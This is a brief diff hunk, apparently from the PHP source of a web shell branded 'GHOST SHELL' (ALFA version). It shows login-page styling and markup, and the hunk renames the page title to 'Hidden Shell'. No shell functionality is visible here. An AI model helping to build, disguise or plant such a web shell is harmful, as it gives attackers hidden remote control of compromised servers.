@@ -533,7 +533,7 @@ body{background: black;}
 #loginbox { font-size:11px; color:green; right:85px; width:1200px; height:200px; border-radius:5px; -moz-boder-radius:5px; position:fixed; top:250px; }
 #loginbox td { border-radius:5px; font-size:11px; }
 </style>
-<title>~ GHOST SHELL-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
+<title>~ Hidden Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
 <center><img style="border-radius:100px;" width="500" height="250" alt="GHOST SHELL 2012" draggable="false" src="https://githack.space/ghost-shell/666/ghoshell.png" /></center>
 <div id=loginbox><p><font face="verdana,arial" size=-1>
 <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
